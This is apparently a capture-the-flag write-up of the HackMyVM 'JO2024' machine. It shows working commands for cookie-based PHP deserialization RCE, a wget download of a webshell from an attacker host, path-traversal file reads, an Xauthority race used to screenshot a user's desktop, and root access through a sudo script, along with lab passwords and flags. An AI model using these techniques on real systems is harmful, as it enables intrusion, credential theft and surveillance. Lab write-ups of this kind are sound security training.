# JO2024

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.82:22
Open 10.0.2.82:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.82
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 e7:ce:f2:f6:5d:a7:47:5a:16:2f:90:07:07:33:4e:a9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLuHH80SwA8Qff3pGOY4aBesL0Aeesw6jqX+pbtR9O7w8jlbyNhuHmjjABb/34BxFp2oBx8o5xuZVXS1cE9nAlE=
|   256 09:db:b7:e8:ee:d4:52:b8:49:c3:cc:29:a5:6e:07:35 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICKFE9s2IvPGAJ7Pt0kSC8t9OXYUrueJQQplSC2wbYtY
80/tcp open  http    syn-ack Apache httpd 2.4.61 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.61 (Debian)
|_http-title: Paris 2024 Olympic Games
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

No outgoing pages, just index page.

![writeup.png](/assets/pentest/hackmyvm/jo2024/writeup.png)

```bash
â””â”€$ feroxbuster -u http://10.0.2.82/ -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough -D -C 404,400,414,500 --dont-scan css,png,jpeg,jpg,gif -n -x .php -S 274
200      GET      207l      688w     7812c http://10.0.2.82/
301      GET        9l       28w      304c http://10.0.2.82/img => http://10.0.2.82/img/
200      GET      207l      688w     7812c http://10.0.2.82/index.php
200      GET      107l      259w     3163c http://10.0.2.82/preferences.php
```

### User Preferences

![writeup-1.png](/assets/pentest/hackmyvm/jo2024/writeup-1.png)

```bash
â””â”€$ echo 'TzoxNToiVXNlclByZWZlcmVuY2VzIjoyOntzOjg6Imxhbmd1YWdlIjtzOjI6ImZyIjtzOjE1OiJiYWNrZ3JvdW5kQ29sb3IiO3M6NDoiI2RkZCI7fQ==' | base64 -d
O:15:"UserPreferences":2:{s:8:"language";s:2:"fr";s:15:"backgroundColor";s:4:"#ddd";} 
```

If page is visited again (with cookie) it renders following information

![writeup-2.png](/assets/pentest/hackmyvm/jo2024/writeup-2.png)

### PHP Deserialization

Resource: [https://swisskyrepo.github.io/PayloadsAllTheThings/Insecure%20Deserialization/PHP](https://swisskyrepo.github.io/PayloadsAllTheThings/Insecure%20Deserialization/PHP)

The given cookie is some kind of object in PHP, but to correctly make attack work we need to know what kind of object it is and what it even does; or guess.

Guessing it is.. Embedding PHP code returned nothing
```bash
â””â”€$ curl http://10.0.2.82/preferences.php -b 'preferences='$(echo 'O:15:"UserPreferences":2:{s:8:"language";s:12:"system("id")";s:15:"backgroundColor";s:4:"#ddd";}' | base64 -w0) -s | html2markdown | grep -v '^$'
Welcome to Your Personalized Page!
Your language setting is system("id").
Your background color is #ddd.

â””â”€$ curl http://10.0.2.82/preferences.php -b 'preferences='$(echo 'O:15:"UserPreferences":2:{s:8:"language";s:13:"system("id");";s:15:"backgroundColor";s:4:"#ddd";}' | base64 -w0) -s | html2markdown | grep -v '^$'
Welcome to Your Personalized Page!
Your language setting is system("id");.
Your background color is #ddd.

â””â”€$ curl http://10.0.2.82/preferences.php -b 'preferences='$(echo 'O:15:"UserPreferences":2:{s:8:"language";s:22:"<?php system("id"); ?>";s:15:"backgroundColor";s:4:"#ddd";}' | base64 -w0) -s | html2markdown |
grep -v '^$'
Welcome to Your Personalized Page!
Your language setting is <?php system("id"); ?>.
Your background color is #ddd.
```

It's a f-ing code execution inside cookie `language`, nomnomnomnomnomnom~ ctf
```bash
â””â”€$ curl http://10.0.2.82/preferences.php -b 'preferences='$(echo 'O:15:"UserPreferences":2:{s:8:"language";s:2:"id";s:15:"backgroundColor";s:4:"#ddd";}' | base64 -w0) -s | html2markdown | grep -v '^$'
Welcome to Your Personalized Page!
Your language setting is id.
Your background color is #ddd.
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### RCE (www-data)

```bash
#!/bin/bash
cmd="$1"
object="O:15:\"UserPreferences\":2:{s:8:\"language\";s:${#cmd}:\"${cmd}\";s:15:\"backgroundColor\";s:4:\"#ddd\";}"
payload="preferences=$(php -r "echo base64_encode('$object');")"

curl -s http://10.0.2.82/preferences.php -b "$payload" | sed '1,/<\/html>/d'
```

```php
â””â”€$ ./rce.sh "cat /var/www/html/preferences.php"

<?php
class UserPreferences {
    public $language;
    public $backgroundColor;

    public function __destruct() {
        if (isset($this->language)) {
            system($this->language); # <--- non nom nom nom
        }
    }
}

if (!isset($_COOKIE['preferences'])) {
    $defaultPreferences = new UserPreferences();
    $defaultPreferences->language = 'fr';  // Default language
    $defaultPreferences->backgroundColor = '#ddd';  // Default background color

    $serializedPreferences = base64_encode(serialize($defaultPreferences));
    setcookie('preferences', $serializedPreferences, time() + 3600, '/');
}

if (isset($_COOKIE['preferences'])) {
    $preferences_data = base64_decode($_COOKIE['preferences']);
    $preferences = unserialize($preferences_data);
}

?>
...
```

I decided to upload webshell.
```bash
â””â”€$ ./rce.sh "wget 10.0.2.15/shell.php -O /var/www/html/shell.php"
```

```bash
www-data@jo2024.hmv:â€¦/www/html# cat /etc/apache2/sites-enabled/000-default.conf
<VirtualHost *:80>
    ServerAdmin webmaster@localhost
    ServerName jo2024.hmv
    DocumentRoot /var/www/html

    ErrorLog ${APACHE_LOG_DIR}/jo.hmv.error.log
    CustomLog ${APACHE_LOG_DIR}/jo.hmv.access.log combined

    <Directory /var/www/html>
        Options Indexes FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>
</VirtualHost>

<VirtualHost *:80>
    ServerAdmin webmaster@jo2024.hmv
    ServerName pictures.jo2024.hmv
    DocumentRoot /var/www/picture

    ErrorLog ${APACHE_LOG_DIR}/pictures.jo.hmv.error.log
    CustomLog ${APACHE_LOG_DIR}/pictures.jo.hmv.access.log combined

    <Directory /var/www/picture>
        Options Indexes FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>
</VirtualHost>
```

### LFI (www-data)

![writeup-3.png](/assets/pentest/hackmyvm/jo2024/writeup-3.png)

```bash
www-data@jo2024.hmv:â€¦/www/picture# cat index.php
<?php
if (isset($_POST['file'])) {
    $file = $_POST['file'];
    $filepath = __DIR__ . '/pictures_gallery/' . $file;

    if (file_exists($filepath)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename=' . basename($filepath));
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($filepath));
        readfile($filepath);
        exit;
    } else {
        echo "<p>File does not exist.</p>";
    }
}
?>
...
```

```bash
â””â”€$ curl 'http://pictures.jo2024.hmv/' -d 'file=../../../../../../../../../../../etc/passwd' -s | grep sh$
root:x:0:0:root:/root:/bin/bash
vanity:x:1000:1000:,,,:/home/vanity:/bin/bash
```

```bash
www-data@jo2024.hmv:â€¦/www/picture# env | grep ^APACHE
APACHE_RUN_DIR=/var/run/apache2
APACHE_PID_FILE=/var/run/apache2/apache2.pid
APACHE_LOCK_DIR=/var/lock/apache2
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data
APACHE_LOG_DIR=/var/log/apache2
```

Hmmm... I thought I could get RCE from LFI, but what's the point if we already have RCE ðŸ¤”

## Lateral Movement

### Backup

There's unusual directory in root. The directory gets updated every minute or so, `ls` can be used to observe access time.
```bash
www-data@jo2024.hmv:â€¦/www/picture# find /backup -ls 2>/dev/null
  1831425      4 drwxr-xr-x   2 vanity   vanity       4096 Oct 11 21:51 /backup
  1831426      4 -rwx------   1 vanity   vanity         35 Oct 11 21:51 /backup/.dmrc
  1831427      4 -rwx------   1 vanity   vanity        158 Oct 11 21:51 /backup/.Xauthority
  1831428      4 -rwx------   1 vanity   vanity        807 Oct 11 21:51 /backup/.profile
  1831429      4 -rwx------   1 vanity   vanity       3526 Oct 11 21:51 /backup/.bashrc
  1831430      4 -rwx------   1 vanity   vanity         36 Oct 11 21:51 /backup/.lesshst
  1831431      4 -rwx------   1 vanity   vanity        220 Oct 11 21:51 /backup/.bash_logout
  1831432      4 -rwx------   1 vanity   vanity          8 Oct 11 21:51 /backup/.xprofile
  1831433      4 -rwx------   1 vanity   vanity        557 Oct 11 21:51 /backup/backup
```

```bash
www-data@jo2024.hmv:/tmp# ./pspy -c=false > /tmp/pspy.log ; sleep 60 ; pkill -f pspy
...
2025/10/11 22:02:45 CMD: UID=0     PID=2      |
2025/10/11 22:02:45 CMD: UID=0     PID=1      | /sbin/init splash
2025/10/11 22:02:57 CMD: UID=33    PID=14840  | /usr/sbin/apache2 -k start
2025/10/11 22:02:57 CMD: UID=33    PID=14841  | sh -c sleep 60; pkill -f pspy 2>&1
2025/10/11 22:03:00 CMD: UID=33    PID=14842  | /usr/sbin/apache2 -k start
2025/10/11 22:03:00 CMD: UID=33    PID=14843  | sh -c ps aux  2>&1
2025/10/11 22:03:01 CMD: UID=0     PID=14845  | /usr/sbin/CRON -f
2025/10/11 22:03:01 CMD: UID=0     PID=14844  | /usr/sbin/cron -f
2025/10/11 22:03:01 CMD: UID=0     PID=14847  | /usr/sbin/CRON -f
2025/10/11 22:03:01 CMD: UID=0     PID=14846  | /usr/sbin/CRON -f
2025/10/11 22:03:01 CMD: UID=0     PID=14848  | /bin/sh -c /root/.local/error.sh
2025/10/11 22:03:01 CMD: UID=1000  PID=14849  | /bin/sh -c /home/vanity/backup
2025/10/11 22:03:01 CMD: UID=1000  PID=14851  | /bin/bash /home/vanity/backup
2025/10/11 22:03:01 CMD: UID=0     PID=14850  | /bin/bash /root/.local/error.sh
2025/10/11 22:03:01 CMD: UID=1000  PID=14853  | /bin/bash /home/vanity/backup
2025/10/11 22:03:01 CMD: UID=1000  PID=14852  | /bin/bash /home/vanity/backup
2025/10/11 22:03:01 CMD: UID=1000  PID=14854  | /bin/bash /home/vanity/backup
...
```

Script
```bash
www-data@jo2024.hmv:/tmp# cat /home/vanity/backup
#!/bin/bash

SRC="/home/vanity"
DEST="/backup"

rm -rf /backup/{*,.*}

echo "Starting copy..."
find "$SRC" -maxdepth 1 -type f ! -name user.txt | while read srcfile; do
    destfile="$DEST${srcfile#$SRC}"
    mkdir -p "$(dirname "$destfile")"
    dd if="$srcfile" of="$destfile" bs=4M

    md5src=$(md5sum "$srcfile" | cut -d ' ' -f1)
    md5dest=$(md5sum "$destfile" | cut -d ' ' -f1)
    if [[ "$md5src" != "$md5dest" ]]; then
        echo "MD5 mismatch for $srcfile :("
    fi
    chmod 700 "$destfile"
done

echo "Copy complete. All files verified !"
```

Readable files 
```bash
www-data@jo2024.hmv:/tmp# find /home -type f -ls 2>/dev/null | grep -v '\.cache'
  1046609      4 -rwxr-xr-x   1 vanity   vanity        199 Jul 27  2024 /home/vanity/.local/mousepad.sh
  1046594      4 -rw-r--r--   1 vanity   vanity         35 Jul 29  2024 /home/vanity/.dmrc
  1046688      4 -rw-------   1 vanity   vanity        158 Oct 11 19:42 /home/vanity/.Xauthority
  1046584      4 -rwx------   1 vanity   vanity         33 Jul 29  2024 /home/vanity/user.txt
  1046531      4 -rw-r--r--   1 vanity   vanity        807 Jul 29  2024 /home/vanity/.profile
  1046532      4 -rw-r--r--   1 vanity   vanity       3526 Jul 29  2024 /home/vanity/.bashrc
  1046612      4 -rw-------   1 vanity   vanity         36 Jul 29  2024 /home/vanity/.lesshst
  1046533      4 -rw-r--r--   1 vanity   vanity        220 Jul 29  2024 /home/vanity/.bash_logout
  1046610      4 -rw-r--r--   1 vanity   vanity          8 Jul 29  2024 /home/vanity/.xprofile
  1046691      4 -rwxr-xr-x   1 vanity   vanity        557 Jul 29  2024 /home/vanity/backup
```

The user seems to login with Graphical Interface and read their credentials with Mousepad.
```bash
www-data@jo2024.hmv:/tmp# cat /home/vanity/.dmrc
[Desktop]
Session=lightdm-xsession

www-data@jo2024.hmv:/tmp# cat /home/vanity/.local/mousepad.sh
#!/bin/bash

rm -f /home/vanity/.local/share/Mousepad/auto*
/usr/bin/mousepad /home/vanity/creds/credentials.txt &
sleep 1
wmctrl -r "credentials.txt - Mousepad" -b add,maximized_vert,maximized_horz
```

We could steal the `.Xauthority` file and take screenshots of user's desktop.

Since the files are deleted, created and later assigned new permissions we can hijack, essentially [TOCTOU](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use)
```bash
www-data@jo2024.hmv:/tmp# umask
0022
```

- `umask 0022`Â â†’ Files:Â `644`Â (`rw-r--r--`), Directories:Â `755`Â (`rwxr-xr-x`)

```bash
(remote) www-data@jo2024.hmv:/tmp$ for((i=6500;i--;)); do base64 /backup/.Xauthority -w0 >> /tmp/x11.log && echo 'Successful!'; sleep 0.01; done 2>/dev/null
Successful!
(remote) www-data@jo2024.hmv:/tmp$ base64 -d /tmp/x11.log > /tmp/.Xauthority
(remote) www-data@jo2024.hmv:/tmp$ file /tmp/.Xauthority
/tmp/.Xauthority: X11 Xauthority data
```

```bash
(remote) www-data@jo2024.hmv:/tmp$ export XAUTHORITY=/tmp/.Xauthority 
(remote) www-data@jo2024.hmv:/tmp$ xwd -root -screen -silent -display :0 > /var/www/html/screenshot.xwd
---
â””â”€$ curl http://jo2024.hmv/screenshot.xwd -sO && convert screenshot.xwd screenshot.png && open screenshot.png
```

![writeup-4.png](/assets/pentest/hackmyvm/jo2024/writeup-4.png)

::: info Note
I think during my fuzzing I crashed the notepad somehow, had to restart for it to show up. Random images kept appearing in screenshots.
:::

## SSH

::: tip Creds
`vanity:xd0oITR93KIQDbiD`
:::

```bash
â””â”€$ sshpass -p 'xd0oITR93KIQDbiD' ssh vanity@jo2024.hmv
vanity@jo2024:~$ id
uid=1000(vanity) gid=1000(vanity) groups=1000(vanity),100(users)
```

### User.txt

```bash
vanity@jo2024:~$ cat user.txt
e2cb9d6e0899cde91130ca4b37139021
```

## Privilege Escalation

```
vanity@jo2024:~$ sudo -l
Matching Defaults entries for vanity on jo2024:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User vanity may run the following commands on jo2024:
    (ALL : ALL) NOPASSWD: /usr/local/bin/php-server.sh
```

```bash
vanity@jo2024:~$ cat /usr/local/bin/php-server.sh
#!/bin/bash

/usr/bin/php -t /opt -S 0.0.0.0:8000

vanity@jo2024:~$ ls /opt -alh
ls: cannot open directory '/opt': Permission denied

vanity@jo2024:~$ sudo /usr/local/bin/php-server.sh
```

![writeup-5.png](/assets/pentest/hackmyvm/jo2024/writeup-5.png)

![writeup-6.png](/assets/pentest/hackmyvm/jo2024/writeup-6.png)

::: tip Creds
`root:LightningBolt123`
:::

```bash
vanity@jo2024:~$ su - root
Password: LightningBolt123
root@jo2024:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```
root@jo2024:~# cat /root/root.txt
cbd60dab37bc85e1f7ea4b5c9c4eed90
```